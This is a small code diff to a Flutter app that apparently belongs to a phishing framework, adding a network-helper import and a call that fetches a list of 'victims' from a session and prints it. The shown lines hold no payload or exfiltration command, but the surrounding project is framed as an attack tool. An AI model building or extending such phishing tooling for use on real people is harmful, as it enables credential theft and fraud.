@@ -1,6 +1,7 @@
 import 'package:flutter/material.dart';
 import 'package:phishing_framework/attack.dart';
 import 'package:phishing_framework/app_scheme.dart';
+import 'package:phishing_framework/helpers/network_helper.dart';
 import 'package:phishing_framework/phishing_homepage.dart';
 
 void main() {
@@ -45,6 +46,8 @@ class _HomePageState extends State<HomePage> {
 
   @override
   Widget build(BuildContext context) {
+    Session.instance.getVictims().then((value) => print(value.body));
+
     return Scaffold(
       appBar: AppBar(),
       drawer: Drawer(
